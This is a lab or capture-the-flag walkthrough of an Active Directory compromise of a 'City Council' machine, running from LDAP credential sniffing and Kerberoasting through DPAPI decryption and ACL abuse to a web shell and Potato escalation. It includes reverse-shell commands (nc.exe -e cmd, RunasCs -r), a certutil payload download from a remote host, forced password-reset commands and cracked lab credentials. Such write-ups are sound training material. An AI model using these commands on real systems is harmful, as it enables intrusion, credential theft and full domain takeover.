# City Council

## Attack Chain :

1. LDAP Traffic Sniffing — Service Account creds exposed

1. Bloodhound

1. Kerberoast — Clerk Credentials

1. SMBWrite Access (Pollution) — NTLM Theft

1. Cracking Passwords — Jon Peters

1. Kerberoast — More users w/ Targetedkerberoast.py

1. Backups Share — Profile Dump Extraction (.wim — wimextract — wiminfo )

1. DPAPI — Emma Hayes Credentials dumping from  Windows Credentials Manager (impacket-dpapi)

1. ACL Abuse — Enabling Sam Brooks profile (BloodyAD)

1. WinRM — Access with Sam Brooks

1. Move + Reset Password web_admin (Powerview.py | bloodyAD | revshell w/ RunasCs.exe)

1. ASPX shell upload (wwwroot)

1. SeImpersonatePrivilege — Potato (Full System Compromise)

# ENUMERATION :

NMAP :

![city-council screenshot 1](images/city-council/city-council-01.png)

## HTTP ENUM :

![city-council screenshot 2](images/city-council/city-council-02.png)

![city-council screenshot 3](images/city-council/city-council-03.png)

Possible usernames crafting

## SMBENUM

- Enum4linux

-
![city-council screenshot 4](images/city-council/city-council-04.png)

![city-council screenshot 5](images/city-council/city-council-05.png)

No RCP Connection.

Shares?

- Smbmap / smbclient

![city-council screenshot 6](images/city-council/city-council-06.png)

Updating /etc/hosts

![city-council screenshot 7](images/city-council/city-council-07.png)

Directories?

- Feroxbuster

![city-council screenshot 8](images/city-council/city-council-08.png)

![city-council screenshot 9](images/city-council/city-council-09.png)

![city-council screenshot 10](images/city-council/city-council-10.png)

![city-council screenshot 11](images/city-council/city-council-11.png)

Interesting

## DOWNLOADING THE APP

Let’s follow the process and download it :

![city-council screenshot 12](images/city-council/city-council-12.png)

Mh …

![city-council screenshot 13](images/city-council/city-council-13.png)

Executable for amd x86-64.

But I’m using an arm64

Let’s try using a simulator :

- Qemu-x86_64

![city-council screenshot 14](images/city-council/city-council-14.png)

![city-council screenshot 15](images/city-council/city-council-15.png)

![city-council screenshot 16](images/city-council/city-council-16.png)

We can submit applications

![city-council screenshot 17](images/city-council/city-council-17.png)

When submitting we can see that there is a svc_services_portal which is performing LDAP bind requests

## LDAP SNIFFING

Can we sniff LDAP requests?

![city-council screenshot 18](images/city-council/city-council-18.png)

Normally we can.

Let’s try with :

- Wireshark tun0Submitting again :

![city-council screenshot 19](images/city-council/city-council-19.png)

Inspecting requests :

![city-council screenshot 20](images/city-council/city-council-20.png)

Indeed we found user and password :

`svc_services_portal : PortAl1337 `

Let’s check with :

- crackmapexec

![city-council screenshot 21](images/city-council/city-council-21.png)

Yes !!

Let’s try to enumerate shares :

![city-council screenshot 22](images/city-council/city-council-22.png)

Users?

![city-council screenshot 23](images/city-council/city-council-23.png)

Anything in SYSVOL?

![city-council screenshot 24](images/city-council/city-council-24.png)

Nothing in scripts

Can we WINRM ? Nope.

BLOODHOUND ENUM

Can we bloodhound?

- Bloodhound-ce-python

![city-council screenshot 25](images/city-council/city-council-25.png)

Indeed we can.

Let’s analyze it :

![city-council screenshot 26](images/city-council/city-council-26.png)

No Outbound Object Control

Let’s try to password spray knowing users :

![city-council screenshot 27](images/city-council/city-council-27.png)

Nope.

## RPC ENUM

RPCCLIENT for potential info leaks?

![city-council screenshot 28](images/city-council/city-council-28.png)

With queryuser :

No leaks.

## KERBEROASTING

Can we kerberoast or AsrepRoast?

Kerberoasting with :

- Impacket-GetUsersSPNs

![city-council screenshot 29](images/city-council/city-council-29.png)

Indeed we got clerk.john hash.

## PASSWORD CRACKING

Let’s crack it :

![city-council screenshot 30](images/city-council/city-council-30.png)

![city-council screenshot 31](images/city-council/city-council-31.png)

Fuck

Let’s try with:

- JTR

![city-council screenshot 32](images/city-council/city-council-32.png)

We got credentials :

`Clerk.john : clerkhill`

Shares?

![city-council screenshot 33](images/city-council/city-council-33.png)

We got READ on Uploads.

What’s inside?

![city-council screenshot 34](images/city-council/city-council-34.png)

Of course “writeAccess Jon.Peters” catches our eyes.

Inspecting :

![city-council screenshot 35](images/city-council/city-council-35.png)

Seems like there is a way of SMB Relay attack

Let’s proceed.

Let’s try to WINRM with clerk :

![city-council screenshot 36](images/city-council/city-council-36.png)

Unsuccessful

RDP? Nope.

Mhh, maybe we can coerce the auth?

https://github.com/p0dalirius/coercer

- coercer:

![city-council screenshot 37](images/city-council/city-council-37.png)

- Checking on the Responder :

![city-council screenshot 38](images/city-council/city-council-38.png)

We got the ntlmv2 hash of DC-CC$!

Can we crack it ?

![city-council screenshot 39](images/city-council/city-council-39.png)

We can’t .

Can we relay?

1. Payload crafting

![city-council screenshot 40](images/city-council/city-council-40.png)

1. Run impacket-ntlmrelayx

![city-council screenshot 41](images/city-council/city-council-41.png)

1. Run coerce :

1.
![city-council screenshot 42](images/city-council/city-council-42.png)

![city-council screenshot 43](images/city-council/city-council-43.png)

Meaning that SIGNING is ENABLED.  We cannot relay as DC then.

Well, we have to find another way

Can we asrep?

![city-council screenshot 44](images/city-council/city-council-44.png)

Nope.

# ACCESS AS JON PETERS

Rechecking SMB Shares with :

- SMBMAP

![city-council screenshot 45](images/city-council/city-council-45.png)

We have write permissions!  Whatthefuck?

Crackmapexec didn’t tell us that :

![city-council screenshot 46](images/city-council/city-council-46.png)

Btw, that will be way easier :

SMB Poisoning, NTLM Theft

## NTLM THEFT

https://github.com/Greenwolf/ntlm_theft

1. Clone the repo

1. Run ntlm_theft.py

![city-council screenshot 47](images/city-council/city-council-47.png)

1. Start a responder :

1.
![city-council screenshot 48](images/city-council/city-council-48.png)

1. Put some files “Browse to folder” in the SMB :

![city-council screenshot 49](images/city-council/city-council-49.png)

1. Check responder :

![city-council screenshot 50](images/city-council/city-council-50.png)

And we got NTLMv2 hash for jon.peters.

## PASSWORD CRACKING

Let’s crack it :

![city-council screenshot 51](images/city-council/city-council-51.png)

![city-council screenshot 52](images/city-council/city-council-52.png)

Fuck

Let’s use JTR :

![city-council screenshot 53](images/city-council/city-council-53.png)

We got the password :

`jon.peters : 1234heresjonny`

Let’s check Bloodhound now :

![city-council screenshot 54](images/city-council/city-council-54.png)

Jon.peters has GenericWrite on 3 users.

Which one worth?

The 3 users have no outbound object control, and are members of the same groups.

Let’s try to RDP or WINRM first : Failed.

We need to have an RDP or WINRM session.

We can see that Peters (as the other 3 members) is member of Certificate Service.

![city-council screenshot 55](images/city-council/city-council-55.png)

Can we use certify to search for vulnerabilities?

Let’s use :

- Certipy-ad find

![city-council screenshot 56](images/city-council/city-council-56.png)

Failed.

Let’s try using :

- Ldap-scheme ldap

- Ldap-port 389

![city-council screenshot 57](images/city-council/city-council-57.png)

We got it.

Let’s check the json :

![city-council screenshot 58](images/city-council/city-council-58.png)

Nothing.

# ACCESS AS MARIA.CLERK & NINA.SOTO

So let’s abuse Maria.Clerk :

![city-council screenshot 59](images/city-council/city-council-59.png)

![city-council screenshot 60](images/city-council/city-council-60.png)

## TARGETEDKERBEROAST

Let’s go for:

-  targetedkerberoast.py :

![city-council screenshot 61](images/city-council/city-council-61.png)

![city-council screenshot 62](images/city-council/city-council-62.png)

![city-council screenshot 63](images/city-council/city-council-63.png)

![city-council screenshot 64](images/city-council/city-council-64.png)

And we got the four hashes (including clerk that we already have).

## CRACKING

Let’s crack them with JTR :

![city-council screenshot 65](images/city-council/city-council-65.png)

We cracked Maria and Nina’s passwords.

`maria.clerk : mariadbzt1221`

`nina.soto : 123nina321`

![city-council screenshot 66](images/city-council/city-council-66.png)

Indeed we got it.

Let’s try to winrm or RDP : Failed for both.

How to move forward?

Maybe let’s check shares?

![city-council screenshot 67](images/city-council/city-council-67.png)

Nina has READ privs on Backups share .

Let’s check it :

![city-council screenshot 68](images/city-council/city-council-68.png)

Let’s check both dirs :

![city-council screenshot 69](images/city-council/city-council-69.png)

![city-council screenshot 70](images/city-council/city-council-70.png)

What can we do with .wim files?

### What are .wim files?

`A .wim file is a Windows Imaging Format archive created by Microsoft. It stores disk images based on files rather than raw sectors, allowing fast deployment, backup, and easy modification of operating systems.`

### How can we extract data?

### To extract .wim files on Linux, use wimlib-imagex or 7-zip via commands like wimapply, wimextract, or 7z x

## PROFILE DUMP EXTRACTION — SAM.BROOKS

Let’s try with :

- wimextract

1. Wiminfo to check how many images are in there:

![city-council screenshot 71](images/city-council/city-council-71.png)

Just one , index : 1

1. Use wimextract <file> <image>

![city-council screenshot 72](images/city-council/city-council-72.png)

![city-council screenshot 73](images/city-council/city-council-73.png)

Wow, we got the /user directory of sam.brooks.

What’s inside?

![city-council screenshot 74](images/city-council/city-council-74.png)

In /Desktop there is a message.

Let’s check :

![city-council screenshot 75](images/city-council/city-council-75.png)

That’s interesting.

We could probably upload an aspx shell later.

## PROFILE DUMP EXTRACTION — CLERK.JOHN

What’s in clerk profile?

Let’s do the same for clerk :

![city-council screenshot 76](images/city-council/city-council-76.png)

![city-council screenshot 77](images/city-council/city-council-77.png)

In /Desktop we found an “Emma-Hayes temporary Access” message.

Let’s check it :

![city-council screenshot 78](images/city-council/city-council-78.png)

Seems there are Emma’s credentials stored in Credentials Manager .

# ACCESS AS EMMA.HAYES

## DPAPI CREDENTIALS DUMPING

Let’s check better :

According to Hacktricks:

https://hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/dpapi-extracting-passwords.html

We need first to find the masterky, then the encrypted data.

1. We found the masterkey in:

`clerk/AppData/Roaming/Microsoft/Protect/S-1-5-21-407732331-1521580060-1819249925-1103 `

![city-council screenshot 79](images/city-council/city-council-79.png)

![city-council screenshot 80](images/city-council/city-council-80.png)

1. The encrypted data in:

`/home/zulema/Hacksmarter/city/clerk/AppData/Roaming/Microsoft/Credentials`

![city-council screenshot 81](images/city-council/city-council-81.png)

### DECRIPTION:

Now let’s try :

**Offline decryption with Impacket dpapi.py**

1. DECRIPTYING MASTERKEY

Using :

- Impacket-dpapi

`impacket-dpapi masterkey -file de222e76-cb5d-418f-a1c2-7e4e9dfe29e1 -sid S-1-5-21-407732331-1521580060-1819249925-1103 -password "clerkhill"`

![city-council screenshot 82](images/city-council/city-council-82.png)

We got a decrypted masterkey in Hex.

1. DECRYPTING CREDENTIALS BLOB :

Now we use the decrypted key in hex to decrypt the credentials blob:

- Impacket-dpapi

`impacket-dpapi credential -file 03128079C6E14F37F5AEBDD69E344291 -key 0xedfc873c4b843cb27b48cb55d829bc24c8d2be3fd50ce2aa7ba72b8da6ec65afd41412dfecd16f38a120cadf4089dabb9a1817874e37bbf0d6861117a39dfbbd`

![city-council screenshot 83](images/city-council/city-council-83.png)

Nad we got Emma credentials :

`emma.hayes : !Gemma4James! `

Double check with crackmapexec:

![city-council screenshot 84](images/city-council/city-council-84.png)

## WINRM ACCESS — ENABLING SAM.BROOKS ACCOUNT

![city-council screenshot 85](images/city-council/city-council-85.png)

Emma has :

- WriteDACL on Sam.Brooks

- WriteDACL on Alex.King

- WriteDacl on Rita.Cho

- WriteDACL on CityOPS

- GenericWrite on Quarantine

- GenericWrite on Web_Admin

Interesting.

Which one worth?

Let’s inspect :

![city-council screenshot 86](images/city-council/city-council-86.png)

We see that Sam.Brooks is member of Remote Management Users ,finally!

Let’s abuse it :

![city-council screenshot 87](images/city-council/city-council-87.png)

![city-council screenshot 88](images/city-council/city-council-88.png)

1. We grant Emma GenericALL permissions :

1. dacledit.py

`dacledit.py -action 'write' -rights 'FullControl' -principal 'controlledUser' -target 'targetUser' 'domain'/'controlledUser':'password'`

![city-council screenshot 89](images/city-council/city-council-89.png)

![city-council screenshot 90](images/city-council/city-council-90.png)

1. Force Change Password :

`net rpc password "TargetUser" "newP@ssword2022" -U "DOMAIN"/"ControlledUser"%"Password" -S "DomainController"`

![city-council screenshot 91](images/city-council/city-council-91.png)

1. Check :

![city-council screenshot 92](images/city-council/city-council-92.png)

Account disabled.

How to enable it?

https://github.com/CravateRouge/bloodyAD/wiki/User-Guide

Indeed we can, with :

- Bloody-AD

![city-council screenshot 93](images/city-council/city-council-93.png)

`bloodyad -H 10.0.26.144 -d city.local -u emma.hayes -p \!Gemma4James\! msldap enableuser “CN=SAM BROOKS,OU=CITYOPS,DC=CITY,DC=LOCAL"`

![city-council screenshot 94](images/city-council/city-council-94.png)

Sam enabled!

Let’s winrm :

![city-council screenshot 95](images/city-council/city-council-95.png)

In /temp we find :

![city-council screenshot 96](images/city-council/city-council-96.png)

We found nothing inside.

Let’s try to move forward.

# ACCESS AS WEB_ADMIN

## TARGETED KERBEROASTING

Can we kerberoast with Emma?

Using :

- targetedkerberoast.py

![city-council screenshot 97](images/city-council/city-council-97.png)

![city-council screenshot 98](images/city-council/city-council-98.png)

Web_admin

Can we crack it?

![city-council screenshot 99](images/city-council/city-council-99.png)

We can’t.

What should we do then?

## ADL OBJECTS ENUMERATION

Let’s enumerate all writable AD objects with detailed output using bloodyAD as emma.hayes on city.local

- bloodyAD

bloodyad -H 10.0.26.144 -d city.local -u emma.hayes -p \!Gemma4James\! get writable --detail

![city-council screenshot 100](images/city-council/city-council-100.png)

## POWERVIEW.PY

Can we run powerview from Linux?

https://github.com/aniqfakhrul/powerview.py

- Pip3 install powerview

![city-council screenshot 101](images/city-council/city-council-101.png)

`powerview city.local/emma.hayes:\!Gemma4James\!@10.0.26.144`

![city-council screenshot 102](images/city-council/city-council-102.png)

We’re prompted with an LDAP terminal

Since we know that webadmin is in Quarantine (as stated in the email),

can we move it to City Ops OU?

Trying to move it :

`Set-DomainObjectDN -Identity "web_admin" -DestinationDN 'OU=CityOps,DC=city,DC=local'`

![city-council screenshot 103](images/city-council/city-council-103.png)

That’s weird cos we have GenericWrite on him.

Reviewing Bloodhound:

![city-council screenshot 104](images/city-council/city-council-104.png)

Got it.

We first have to WriteDACL on City Ops, granting GenericALL, and then re-try it.

## GRANTING FULLCONTROL ON CITY OPS:

For granting GenericALL on City Ops:

![city-council screenshot 105](images/city-council/city-council-105.png)

`dacledit.py -action 'write' -rights 'FullControl' -inheritance -principal 'JKHOLER' -target-dn 'OUDistinguishedName' 'domain'/'user':'password'`

![city-council screenshot 106](images/city-council/city-council-106.png)

![city-council screenshot 107](images/city-council/city-council-107.png)

And now trying again to move web_admin :

![city-council screenshot 108](images/city-council/city-council-108.png)

Success.

## SHADOW CREDENTIALS ATTACK

Since we have GenericWrite on web_admin, we can now run a Shadow Credentials Attack:

`With Shadow Credentials Attack, instead of stealing or changing a target account's password, the attacker appends an alternate, certificate-based credential to the account. This allows them to impersonate the target user or computer indefinitely, even if the victim changes their password. `

![city-council screenshot 109](images/city-council/city-council-109.png)

We’re using :

- Pywhisker.py

`python3 pywhisker.py -d city.local -u emma.hayes -p \!Gemma4James\! --target web_admin --action add`

![city-council screenshot 110](images/city-council/city-council-110.png)

![city-council screenshot 111](images/city-council/city-council-111.png)

Now we can use:

- PKINIT

To request the authentication with .pfx key :

![city-council screenshot 112](images/city-council/city-council-112.png)

Browsing the error:

The Domain Controller does not support PKINIT, probably because it has not valid certificate for the DC Auth.

Let’s try with :

- Certipy-ad auth

`certipy-ad auth -pfx ../fqFZxbR9.pfx -password ZcZ80eWllTlpvXu76yln  -dc-ip 10.0.26.144 -domain city.local -username web_admin`

![city-council screenshot 113](images/city-council/city-council-113.png)

Same.

How to proceed then?

## WEB_ADMIN PASSWORD CHANGE

We can directly change password with:

- bloodyAD  or

- Net rpc password

`net rpc password "web_admin" "zulema123" -U city.council/emma.hayes%\!Gemma4James\! -S "DC-CC.city.local"`

![city-council screenshot 114](images/city-council/city-council-114.png)

That was way easier.

Let’s check :

![city-council screenshot 115](images/city-council/city-council-115.png)

Indeed we did it.

WINRM & RDP = Failed.

How to spawn a shell with webadmin?

Maybe using :

- RunasCs.exe

or :

- Invoke-RunasCs.ps1

(on sam.brooks winrm)

![city-council screenshot 116](images/city-council/city-council-116.png)

![city-council screenshot 117](images/city-council/city-council-117.png)

The .ps1 is not working

## RUNASCS.EXE

Let’s try with the .exe :

https://github.com/antonioCoco/RunasCs/blob/master/README.md

We have to compile it :

https://github.com/antonioCoco/RunasCs/blob/master/compile_commands.txt

1. Transfer the .c binary :

![city-council screenshot 118](images/city-council/city-council-118.png)

1. Compile :

`C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe -target:exe -optimize -out:RunasCs.exe RunasCs.cs`

![city-council screenshot 119](images/city-council/city-council-119.png)

1. Run it :

![city-council screenshot 120](images/city-council/city-council-120.png)

Since I don’t know why I’m not able to spawn cmd.exe , let’s try to gain a reverse shell :

![city-council screenshot 121](images/city-council/city-council-121.png)

`./RunasCs.exe web_admin zulema123 cmd.exe -r 10.200.74.115:1234`

![city-council screenshot 122](images/city-council/city-council-122.png)

And in Penelope :

![city-council screenshot 123](images/city-council/city-council-123.png)

We got a shell.

# ACCESS AS IIS APPPOOL

In /inetpub/wwwroot/uploads we found a test.aspx (that could be a shell)

![city-council screenshot 124](images/city-council/city-council-124.png)

Let’s see if we can put something in the directory and open it from the web :

![city-council screenshot 125](images/city-council/city-council-125.png)

![city-council screenshot 126](images/city-council/city-council-126.png)

Indeed we can.

Next step :

- Uploading a shell .aspx in order to gain a reverse shell again .

1. Transferring the cmdasp.aspx

![city-council screenshot 127](images/city-council/city-council-127.png)

1. Open it in the web :

![city-council screenshot 128](images/city-council/city-council-128.png)

![city-council screenshot 129](images/city-council/city-council-129.png)

We got Impersonate Privileges

1. Transfer NC.EXE and spawn a revshell

We’re gonna use :

`certutil.exe -urlcache -f http://10.0.0.5/40564.exe C:/Temp/bad.exe`

(We’re gonna first create a /Temp directory and then transfer the file in it)

1. Start Penelope and spawn nc.exe :

`C:/Temp/nc.exe 10.200.74.115 9090 -e cmd`

![city-council screenshot 130](images/city-council/city-council-130.png)

And we got it.

# FULL SYSTEM COMPROMISE

Final Step is to Impersonate Privileges.

We’re gonna use :

- PrintSpooferx64 or

- Any other Potato.

We can directly upload it from Penelope :

![city-council screenshot 131](images/city-council/city-council-131.png)

We should find it in “modules”

![city-council screenshot 132](images/city-council/city-council-132.png)

We can upload it with :

- run upload_potato

![city-council screenshot 133](images/city-council/city-council-133.png)

We enter in the session and we run it :

![city-council screenshot 134](images/city-council/city-council-134.png)

![city-council screenshot 135](images/city-council/city-council-135.png)

![city-council screenshot 136](images/city-council/city-council-136.png)

![city-council screenshot 137](images/city-council/city-council-137.png)

And …

# PWNED
